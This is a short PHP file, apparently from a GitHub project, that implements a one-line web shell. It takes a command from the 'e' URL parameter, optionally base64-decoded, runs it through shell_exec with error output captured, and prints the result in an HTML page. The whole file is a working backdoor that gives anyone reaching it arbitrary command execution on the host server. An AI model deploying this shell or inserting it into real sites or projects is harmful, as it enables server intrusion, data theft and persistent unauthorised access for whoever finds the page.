<!-- One Liner PHP Shell by Jiab77 - https://github.com/Jiab77/olpws -->
<?php echo '<html><head><title>One Liner PHP SHell</title></head><body><pre>'. PHP_EOL . @shell_exec((empty(htmlspecialchars(base64_decode($_GET['e'], true)))?$_GET['e']:base64_decode($_GET['e'])).' 2>&1').'</pre></body></html>'. PHP_EOL; ?>
